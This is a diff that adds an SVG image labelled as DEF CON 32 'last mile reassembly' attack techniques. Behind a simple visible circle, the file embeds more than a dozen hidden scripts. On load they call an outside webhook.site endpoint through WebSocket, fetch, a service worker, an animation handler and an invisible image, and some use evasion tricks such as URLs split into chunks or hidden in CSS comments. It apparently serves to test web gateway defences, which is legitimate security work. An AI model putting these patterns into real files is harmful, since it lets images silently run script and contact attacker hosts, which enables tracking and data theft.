@@ -1,0 +1,292 @@
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200" viewBox="0 0 200 200">
+  <!-- DEF CON 32 Last Mile Reassembly Attack Techniques -->
+  <defs>
+    <style>
+      .hidden { display: none; }
+      .trigger { animation: reassemble 1s ease-in-out infinite; }
+      @keyframes reassemble {
+        0% { opacity: 0; }
+        50% { opacity: 0.5; }
+        100% { opacity: 1; }
+      }
+    </style>
+  </defs>
+  
+  <!-- Visible Element -->
+  <circle cx="100" cy="100" r="50" fill="#ff6b6b" class="trigger"/>
+  <text x="100" y="105" text-anchor="middle" fill="white" font-family="Arial" font-size="12">DEF CON 32</text>
+  
+  <!-- Technique 1: WebSocket Channel Bypass -->
+  <script type="text/javascript">
+    <![CDATA[
+    try {
+      const ws = new WebSocket('wss://webhook.site/#!/unique-id-here/websocket');
+      ws.onopen = function() {
+        ws.send(JSON.stringify({type: 'websocket_bypass', source: 'defcon32_svg', timestamp: Date.now()}));
+      };
+    } catch(e) {}
+    ]]>
+  </script>
+  
+  <!-- Technique 2: WebRTC Data Channel -->
+  <script type="text/javascript">
+    <![CDATA[
+    try {
+      const pc = new RTCPeerConnection();
+      const dc = pc.createDataChannel('bypass');
+      dc.onopen = function() {
+        fetch('https://webhook.site/unique-id-here', {
+          method: 'POST',
+          body: JSON.stringify({technique: 'webrtc_bypass', status: 'success'})
+        }).catch(() => {});
+      };
+    } catch(e) {}
+    ]]>
+  </script>
+  
+  <!-- Technique 3: gRPC-Web Bypass -->
+  <script type="text/javascript">
+    <![CDATA[
+    try {
+      // Simulate gRPC-Web request
+      const grpcData = new Uint8Array([0x00, 0x00, 0x00, 0x00, 0x05, 0x08, 0x96, 0x01]);
+      fetch('https://webhook.site/unique-id-here', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/grpc-web+proto',
+          'X-Grpc-Web': '1'
+        },
+        body: grpcData
+      }).catch(() => {});
+    } catch(e) {}
+    ]]>
+  </script>
+  
+  <!-- Technique 4: Canvas Engine Phishing Reconstruction -->
+  <canvas id="hiddenCanvas" width="1" height="1" style="display:none;"></canvas>
+  <script type="text/javascript">
+    <![CDATA[
+    try {
+      const canvas = document.getElementById('hiddenCanvas');
+      const ctx = canvas.getContext('2d');
+      
+      // Reconstruct malicious content client-side
+      ctx.fillStyle = '#ff0000';
+      ctx.fillRect(0, 0, 1, 1);
+      
+      // Extract and trigger
+      const imageData = canvas.toDataURL();
+      fetch('https://webhook.site/unique-id-here', {
+        method: 'POST',
+        body: JSON.stringify({technique: 'canvas_reconstruction', data: imageData.substring(0, 100)})
+      }).catch(() => {});
+    } catch(e) {}
+    ]]>
+  </script>
+  
+  <!-- Technique 5: Hiding in Plain Sight - CSS Steganography -->
+  <style>
+    .steganography {
+      background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==');
+      /* Hidden payload in CSS comments: webhook.site/unique-id-here */
+    }
+  </style>
+  <div class="steganography hidden"></div>
+  <script type="text/javascript">
+    <![CDATA[
+    try {
+      // Extract from CSS
+      const styles = document.styleSheets[document.styleSheets.length-1];
+      const rule = styles.cssRules[0];
+      const comment = rule.cssText.match(/\/\*.*webhook\.site\/([^\s]+).*\*\//)?.[1];
+      if (comment) {
+        fetch('https://webhook.site/' + comment, {
+          method: 'POST',
+          body: JSON.stringify({technique: 'css_steganography', extracted: comment})
+        }).catch(() => {});
+      }
+    } catch(e) {}
+    ]]>
+  </script>
+  
+  <!-- Technique 6: WASM Payload Assembly -->
+  <script type="text/javascript">
+    <![CDATA[
+    try {
+      // Minimal WASM module that triggers network request
+      const wasmCode = new Uint8Array([
+        0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,
+        0x01, 0x07, 0x01, 0x60, 0x02, 0x7f, 0x7f, 0x01, 0x7f
+      ]);
+      
+      WebAssembly.instantiate(wasmCode).then(() => {
+        fetch('https://webhook.site/unique-id-here', {
+          method: 'POST',
+          body: JSON.stringify({technique: 'wasm_assembly', status: 'executed'})
+        }).catch(() => {});
+      }).catch(() => {});
+    } catch(e) {}
+    ]]>
+  </script>
+  
+  <!-- Technique 7: Chunked Assembly Attack -->
+  <script type="text/javascript">
+    <![CDATA[
+    try {
+      // Split payload across multiple variables
+      const chunk1 = 'https://webhook';
+      const chunk2 = '.site/unique';
+      const chunk3 = '-id-here';
+      const chunk4 = '/chunked_assembly';
+      
+      // Reassemble at runtime
+      const fullUrl = chunk1 + chunk2 + chunk3;
+      
+      setTimeout(() => {
+        fetch(fullUrl, {
+          method: 'POST',
+          body: JSON.stringify({technique: 'chunked_assembly', chunks: 4})
+        }).catch(() => {});
+      }, 2000);
+    } catch(e) {}
+    ]]>
+  </script>
+  
+  <!-- Technique 8: Service Worker Registration -->
+  <script type="text/javascript">
+    <![CDATA[
+    try {
+      if ('serviceWorker' in navigator) {
+        const swCode = `
+          self.addEventListener('install', function(event) {
+            fetch('https://webhook.site/unique-id-here', {
+              method: 'POST',
+              body: JSON.stringify({technique: 'service_worker', status: 'installed'})
+            }).catch(() => {});
+          });
+        `;
+        
+        const blob = new Blob([swCode], {type: 'application/javascript'});
+        const swUrl = URL.createObjectURL(blob);
+        
+        navigator.serviceWorker.register(swUrl).catch(() => {});
+      }
+    } catch(e) {}
+    ]]>
+  </script>
+  
+  <!-- Technique 9: Broadcast Channel API -->
+  <script type="text/javascript">
+    <![CDATA[
+    try {
+      const bc = new BroadcastChannel('defcon32_channel');
+      bc.postMessage({technique: 'broadcast_channel', timestamp: Date.now()});
+      
+      bc.onmessage = function(event) {
+        fetch('https://webhook.site/unique-id-here', {
+          method: 'POST',
+          body: JSON.stringify(event.data)
+        }).catch(() => {});
+      };
+      
+      // Self-trigger
+      setTimeout(() => bc.postMessage({status: 'triggered'}), 1000);
+    } catch(e) {}
+    ]]>
+  </script>
+  
+  <!-- Technique 10: SharedArrayBuffer Exploitation -->
+  <script type="text/javascript">
+    <![CDATA[
+    try {
+      if (typeof SharedArrayBuffer !== 'undefined') {
+        const sab = new SharedArrayBuffer(1024);
+        const view = new Uint8Array(sab);
+        
+        // Write payload to shared memory
+        const payload = 'defcon32_shared_buffer';
+        for (let i = 0; i < payload.length; i++) {
+          view[i] = payload.charCodeAt(i);
+        }
+        
+        fetch('https://webhook.site/unique-id-here', {
+          method: 'POST',
+          body: JSON.stringify({technique: 'shared_array_buffer', size: sab.byteLength})
+        }).catch(() => {});
+      }
+    } catch(e) {}
+    ]]>
+  </script>
+  
+  <!-- Technique 11: Intersection Observer Trigger -->
+  <div id="observer-target" style="position: absolute; top: -1px; left: -1px; width: 1px; height: 1px;"></div>
+  <script type="text/javascript">
+    <![CDATA[
+    try {
+      const observer = new IntersectionObserver((entries) => {
+        entries.forEach(entry => {
+          if (entry.isIntersecting) {
+            fetch('https://webhook.site/unique-id-here', {
+              method: 'POST',
+              body: JSON.stringify({technique: 'intersection_observer', intersecting: true})
+            }).catch(() => {});
+          }
+        });
+      });
+      
+      const target = document.getElementById('observer-target');
+      if (target) observer.observe(target);
+    } catch(e) {}
+    ]]>
+  </script>
+  
+  <!-- Technique 12: Performance Observer -->
+  <script type="text/javascript">
+    <![CDATA[
+    try {
+      const perfObserver = new PerformanceObserver((list) => {
+        const entries = list.getEntries();
+        if (entries.length > 0) {
+          fetch('https://webhook.site/unique-id-here', {
+            method: 'POST',
+            body: JSON.stringify({technique: 'performance_observer', entries: entries.length})
+          }).catch(() => {});
+        }
+      });
+      
+      perfObserver.observe({entryTypes: ['navigation', 'resource']});
+    } catch(e) {}
+    ]]>
+  </script>
+  
+  <!-- Technique 13: Crypto API Abuse -->
+  <script type="text/javascript">
+    <![CDATA[
+    try {
+      crypto.subtle.generateKey(
+        {name: 'RSA-OAEP', modulusLength: 2048, publicExponent: new Uint8Array([1, 0, 1]), hash: 'SHA-256'},
+        true,
+        ['encrypt', 'decrypt']
+      ).then(() => {
+        fetch('https://webhook.site/unique-id-here', {
+          method: 'POST',
+          body: JSON.stringify({technique: 'crypto_api_abuse', status: 'key_generated'})
+        }).catch(() => {});
+      }).catch(() => {});
+    } catch(e) {}
+    ]]>
+  </script>
+  
+  <!-- Final Fallback: Traditional Image Request -->
+  <image xlink:href="https://webhook.site/unique-id-here/fallback.png" width="1" height="1" opacity="0"/>
+  
+  <!-- SVG Animation Trigger -->
+  <animateTransform attributeName="transform" type="rotate" values="0 100 100;360 100 100" dur="5s" repeatCount="indefinite" onbegin="
+    try {
+      fetch('https://webhook.site/unique-id-here', {
+        method: 'POST',
+        body: JSON.stringify({technique: 'svg_animation_trigger', timestamp: Date.now()})
+      }).catch(() => {});
+    } catch(e) {}
+  "/>
+</svg>
